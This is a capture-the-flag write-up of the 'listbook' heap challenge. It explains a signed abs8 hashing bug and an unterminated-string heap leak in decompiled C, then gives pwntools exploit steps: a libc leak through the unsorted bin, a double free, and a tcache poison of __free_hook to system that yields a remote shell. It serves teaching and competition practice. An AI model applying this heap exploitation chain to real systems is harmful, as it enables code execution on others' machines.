# listbook

`nc 111.186.58.249 20001`

**files**: [attachment](https://attachment.ctf.0ops.sjtu.cn/listbook_89bf6884d0cac7a966444e13c3f57775.zip) (libc-2.31.so, listbook)

```sh
$ checksec listbook
[*] 'listbook'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ ./libc-database/identify libc-2.31.so
libc6_2.31-0ubuntu9.2_amd64
```

## Functions

There is a simple heap CLI:

```c
char banner[] = ""
    " _     _     _   ____              _    \n"
    "| |   (_)___| |_| __ )  ___   ___ | | __\n"
    "| |   | / __| __|  _ \\ / _ \\ / _ \\| |/ /\n"
    "| |___| \\__ \\ |_| |_) | (_) | (_) |   < \n"
    "|_____|_|___/\\__|____/ \\___/ \\___/|_|\\_\\\n"
    "==============================================\n";
__int64 getind() {
  unsigned v1 = 0;
  __isoc99_scanf("%d", &v1);
  return v1;
}
unsigned getopt() {
  puts("1.add");
  puts("2.delete");
  puts("3.show");
  puts("4.exit");
  printf(">>");
  return (unsigned int)getind();
}
unsigned int setbufs() {
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  return alarm(0x3Cu);
}
void main() {
  setbufs();
  puts(banner);
  while ( 1 ) {
    int opt = getopt()
    if ( opt == 4 ) {
      puts("bye!");
      exit(0);
    } else if ( opt == 3 ) view();
    else if (opt == 2) delete();
    else if (opt == 1) add();
    else puts("invalid");
  }
}
```

And associated pwntools i/o code:

```python
from pwnscripts import *
context.libc = 'libc-2.31.so'
context.libc.symbols['main_arena'] = 0x1ebb80
context.binary = 'listbook'
r = remote('111.186.58.249', 20001)
def choose(opt: int): r.sendlineafter('>>', str(opt))
def add(name: bytes, content: bytes):
    choose(1)
    r.sendafter('name>', name)
    r.sendafter('content>', content.ljust(0x200, b' '))
def delete(ind: int):
    choose(2)
    r.sendlineafter('index>', str(ind))
def view(ind: int):
    choose(3)
    r.sendlineafter('index>', str(ind))
    ret = []
    while b' => ' in (line := r.recvline()): ret.append(line[:-1].split(b' => '))
    return ret
```

### add

```c
void read_and_zero_newline(char *s, int max) {
  char *result; // rax
  int i; // [rsp+1Ch] [rbp-4h]
  for (int i = 0; i < max; ++i) {
    read(0, s+i, 1);
    if ( s[i] == '\n' ) {
      s[i] = '\0';
      return;
    }
  }
}
int add() {
  printf("name>");
  thing *s = malloc(0x20uLL);
  memset(s, 0, sizeof(thing));
  read_and_zero_newline(s->name, 0x10);
  s->content = malloc(0x200uLL);
  printf("content>");
  read_and_zero_newline(s->content, 0x200);
  int hash = hash_name(s, 0x10);
  if ( hashmap[hash] ) s->next = hashtable[hash];
  hashtable[hash] = s;
  hashmap[hash] = 1;
  return puts("done");
}
```

`malloc(0x20)` is first used to allocate a `thing`, which is essentially a linked list node:

```c
typedef struct thing {
  char name[16];
  thing* next;
  char* content;
} thing;
```

Both `name` and `content` are user-controlled data fields. `read_and_zero_newline()` doesn't nul-terminate strings without newlines, so a fully-filled `name[]` can be used to leak the `next` pointer (i.e. heap leak). The `->content` pointer is allocated with `malloc(0x200)`. 

`add()` will then add the new `thing` to a `hashmap`. The hash of a `thing` is calculated based on the sum of the characters in its `name[]`, modulo 16. 

```c
int hashmap[256]; // idb
thing* hashtable[16]; // idb

__int64 hash_name(thing *a1, int sz) {
  char sum = 0;
  for (int i = 0; i < sz; ++i)
    sum += a1->name[i];
  sum = abs8(sum);
  if ( sum > 15 )
    sum %= 16;
  return (unsigned int)sum;
}
```

The hardest part of this challenge is identifying the bug present in `hash_name`. `hash_name` is supposed to return a number within `[0,16)`, but there are a few things that tipped me off:

1. Why is `hashmap[]` 256 members long? Padding doesn't explain this.
2. Weird typing and redundancies: `sum` as a `char`, comparing `sum>15` before modulus, returning an `__int64` with an `unsigned` cast...
3. Personally, I identified the bug by just bruteforcing all possible return values for `abs8()`:

```c
int hash_name(char *a1, int sz) {
  char sum; // [rsp+17h] [rbp-5h]
  int i; // [rsp+18h] [rbp-4h]
  char v3 = 0;
  for ( i = 0; i < sz; ++i )
    v3 += a1[i];
  sum = v3 < 0 ? -v3 : v3;
  if ( sum > 15 )
    sum %= 16;
  return (unsigned int)sum;
}
int main() {
    char s[0x10] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
    for (int i = 0; i < 0x100; i++) {
        *s = i;
        printf("%d\n", hash_name(s, 0x10));
    }
}
```

One way or another, you'll discover that `abs8(-128) == -128`, which has the consequence of setting `hashmap[0]` and `hashmap[1]` to non-zero values.

Also, this function will generate a `name[]` that produces hash `h`:

```python
def hash_to_str(h: int) -> bytes:
    if h in range(0x10): return b'\x81'*0xf + bytes([h+0x80-0xf])
    else: return b'\x08'*0x10 # produce -128
```

### view

```c
int view() {
  printf("index>");
  int ind = getind();
  if ( ind < 0 || ind > 15 ) puts("invalid");
  else if ( hashtable[ind] && hashmap[ind] ) {
    thing *s = hashtable[ind];
    for (thing *i = s; i; i = s = i->next)
      printf("%s => %s\n", i->name, (const char *)i->content);
  } else puts("empty");
}
```

With non-nul-terminated strings, you can leak a heap pointer here. With the `hash_name(...) == -128` bug, you can leak libc via unsorted bin.

### delete

```c
int delete(){
  thing *s; // [rsp+18h] [rbp-8h]
  printf("index>");
  int ind = getind();
  if ( ind < 0 || ind > 15 ) puts("invalid");
  else if ( hashtable[ind] && hashmap[ind] ) {
    for (thing *i = hashtable[ind]; i; i = s) {
      s = i->next;
      i->next = 0;
      free(i->content);
    }
    hashmap[ind] = 0;
  } else puts("empty");
}
```

It's worthwhile noting that `hashtable[ind]` isn't zeroed, and that only the `->content` pointer (and not the `thing*` itself) is `free()`ed.

## exploit

My code is too messy to clean. In summary:

1. leak libc via unsorted_bin using the `abs8()` bug.

   ```c
   # I do a lot of other unnecessary things here too
   for i in range(1): add(hash_to_str(0xd), b'backup')
   for i in range(7): add(hash_to_str(0xf), b'tcache')
   for i in range(1): add(hash_to_str(5), b'idk')
   add(hash_to_str(0), b'main_arena leaker')
   add(hash_to_str(0xe), b'prevent consolidation')
   heap_leak = unpack(view(0xf)[0][0][0x10:], 'all')
   heap_base = heap_leak - 0x1260
   delete(0xf)
   delete(0xd)
   delete(0)
   add(hash_to_str(-128), b'trigger abs8 bug')
   libc_leak = unpack(view(0)[0][-1], 'all')
   context.libc.address = libc_leak-0x1ebde0
   print(hex(heap_base))
   ```

    This has the added benefit of causing future `malloc(0x20)` calls to pull memory from the unsorted bin, which causes future `malloc(0x200)` allocations to be contiguous.

2. Allocate a few contiguous `malloc(0x200)` spaces in memory. Make sure that `hashtable[1]` points to somewhere in the middle of that contiguous space.
   Ensure that the tcache is filled. Free the contiguous space, creating a larger consolidated chunk in the unsorted bin. 

   ```c
   # At this point, tcache[size=0x210] has 6 pointers, small_bins[size=0x210] has one pointer (hashtable[0]), and unsorted_bins[0] has a 0x1e0 chunk that will be gradually consumed via malloc(0x20) calls. 
   for i in range(7): add(hash_to_str(0xf), b'tcache')
   for i in range(2): add(hash_to_str(9), b'aligned allocations')
   add(hash_to_str(1), b'aligned[2]')
   add(hash_to_str(8), b'padding')
   delete(0xf)
   delete(9)
   delete(1)
   ```

3. Use the `abs8` bug again to double free `hashtable[1]`. This works because `malloc` doesn't detect that the chunk at `hashtable[1]` is already a part of the larger chunk on the unsorted bin. `hashtable[1]` now exists in the tcache as well.

   ```c
   # len(tcache[size=0x210]) == 7; unsorted_bins has a 0x630 sized chunk, hashtable[0] points to unsorted_bins->fd+0x420.
   for i in range(6): add(hash_to_str(0xf), b'tcache')
   add(hash_to_str(-128), b'trigger abs8 bug')
   add(hash_to_str(7), b'pad')
   delete(0xf)
   for i in range(2): add(hash_to_str(0xf), b'tcache')
   delete(1)
   delete(0xf)
   add(hash_to_str(0xf), b'/bin/sh\0')
   add(pack(context.libc.sym.__free_hook)+pack(0), b'gotcha')
   ```

    Keep freeing and allocating until the next `malloc(0x30)` call will coincide with the start of the chunk for `hashtable[1]`. Overwrite `hashtable[1]->fd` to become `__free_hook`.

4. A future `tcache` allocation will overwrite `__free_hook`. Write `system()` and call `"/bin/sh"`.

   ```c
   add(hash_to_str(0xb), b'\n')
   add(hash_to_str(0xb), pack(context.libc.sym.system))
   delete(0xf)
   r.interactive()
   ```

That's it.

